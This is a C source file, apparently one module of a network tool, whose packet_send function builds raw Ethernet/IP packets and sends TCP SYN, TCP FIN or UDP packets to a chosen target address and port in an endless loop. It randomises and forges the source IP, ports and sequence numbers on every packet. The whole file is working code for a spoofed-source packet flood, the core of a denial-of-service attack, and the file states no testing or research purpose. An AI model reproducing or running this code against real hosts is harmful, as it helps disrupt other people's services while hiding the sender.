#include <stdio.h>
#include <net/ethernet.h>	// struct ether_header
#include <netinet/ip.h>		// struct ip
#include <netinet/tcp.h>	// struct tcphdr
#include <netinet/udp.h>	// struct udphdr
#include <netpacket/packet.h>	// struct sockaddr_ll
#include <net/if.h>		// struct ifreq

#include <stdlib.h>		// srand(), rand()
#include <time.h>		// time()
#include <string.h>		// memset(), memcpy(), strncpy()
#include <unistd.h>		// write(), close()
#include <arpa/inet.h>		// inet_ntoa(), htons()
#include <sys/socket.h>		// socket(), bind()
#include <sys/ioctl.h>		// ioctl()
#include <pthread.h>

#include "send.h"
#include "checksum.h"

// DEBUG
void rawprint(const uint8_t * const packet, int packetlen)
{
	printf("------- RAW -------\n");
	int i = 0;
	while( i < packetlen ) {
		printf("%02x ", *(packet+i));
		if( ++i%16 == 0 ) printf("\n");
	}
	if( i%16 != 0 ) printf("\n-------------------\n");
	else printf("-------------------\n");
}

void packet_send(struct in_addr ip, uint16_t port, uint8_t type)
{
	uint8_t packet[IP_MAXPACKET];
	struct ifreq ifr;
	struct sockaddr_ll sll;
	int sockfd, done = 0;

	int ethdrlen = sizeof(struct ether_header);
	int iphdrlen = sizeof(struct ip);
	int tcphdrlen = sizeof(struct tcphdr);
	int udphdrlen = sizeof(struct udphdr);
	int packetlen = ethdrlen + iphdrlen;
	int payloadlen = 0;

	struct ether_header *eth = (struct ether_header *)packet;
	struct ip *iphdr = (struct ip *)(packet + ethdrlen);
	struct tcphdr *tcphdr = (struct tcphdr *)((uint8_t *)iphdr + iphdrlen);
	struct udphdr *udphdr = (struct udphdr *)((uint8_t *)iphdr + iphdrlen);
	char *payload;

	memset(packet, 0, IP_MAXPACKET);
	//printf("\tsend() - IP: %s, PORT: %d, TYPE:%x\n", inet_ntoa(ip), port, type);

	/* Set Static Options */
	eth->ether_type = htons(ETHERTYPE_IP);

	iphdr->ip_hl = iphdrlen / sizeof(uint32_t); // 5
	iphdr->ip_v = 4;
	iphdr->ip_ttl = 128;
	memcpy(&iphdr->ip_dst, &ip, sizeof(struct in_addr));

	if( type == UDP ) {
		payload = (char *)packet + packetlen + udphdrlen;
		payloadlen = UDP_PAYLOAD;

		iphdr->ip_p = IPPROTO_UDP;
		udphdr->len = htons(udphdrlen + payloadlen);
		udphdr->dest = htons(port);

		packetlen += udphdrlen + payloadlen;

	}else {
		payload = (char *)packet + packetlen + tcphdrlen;

		iphdr->ip_p = IPPROTO_TCP;
		tcphdr->dest = htons(port);
		tcphdr->doff = tcphdrlen / 4;  // 5
		tcphdr->window = htons(8192);

		if( type == SYN ) {
			memcpy(payload, "\x05\xb4\x01\x01\x04\x02", 6);
			payloadlen = 6;

			iphdr->ip_len = htons(iphdrlen + tcphdrlen + 6);
			tcphdr->syn = 1;
		}else {
			iphdr->ip_len = htons(iphdrlen + tcphdrlen);
			tcphdr->fin = 1;
		}

		packetlen += tcphdrlen + payloadlen;
	}

	/* SEND PACKET */
	srand(time(NULL) + pthread_self());

	/* Set Packet Options */
	if( (sockfd = socket(PF_PACKET, SOCK_RAW, IPPROTO_RAW)) < 0 ) {
		perror("socket(): ");
		return;
	}

	memset(&ifr, 0, sizeof(struct ifreq));
	strncpy(ifr.ifr_name, "eth0", IFNAMSIZ-1);

	if( ioctl(sockfd, SIOCGIFINDEX, &ifr) < 0 ) {
		perror("ioctl(): ");
		close(sockfd);
		return;
	}

	sll.sll_family = AF_PACKET;
	sll.sll_ifindex = ifr.ifr_ifindex;

	if( bind(sockfd, (struct sockaddr *)&sll, sizeof(sll)) < 0 ) {
		perror("bind(): ");
		close(sockfd);
		return;
	}

	while( 1 ) {
		/* IP HEADER */
		iphdr->ip_id = rand();
		iphdr->ip_src.s_addr = rand();
		iphdr->ip_sum = 0;
		iphdr->ip_sum = checksum((uint16_t *)iphdr, iphdrlen);

		if( type == UDP ) {
		/* UDP HEADER */
			udphdr->source = rand();
			udphdr->check = 0;
			udphdr->check = udp_checksum(iphdr, udphdr, payload, payloadlen);

		}else {
		/* TCP HEADER */
			tcphdr->source = rand();
			tcphdr->seq = rand();
			tcphdr->ack_seq = rand();
			tcphdr->check = 0;
			tcphdr->check = tcp_checksum(iphdr, tcphdr, payload, payloadlen);
		}

		//rawprint(packet, packetlen);

		/* SEND PACKET */
//		if( (done = write(sockfd, packet, packetlen)) != packetlen )
		if( (done = write(sockfd, packet, packetlen)) < 0 ) {
			perror("write()");

		}else if( done != packetlen ) {
			printf("%d / %d bytes sended\n", done, packetlen);
		}

		sleep(1);
	}

	close(sockfd);
}
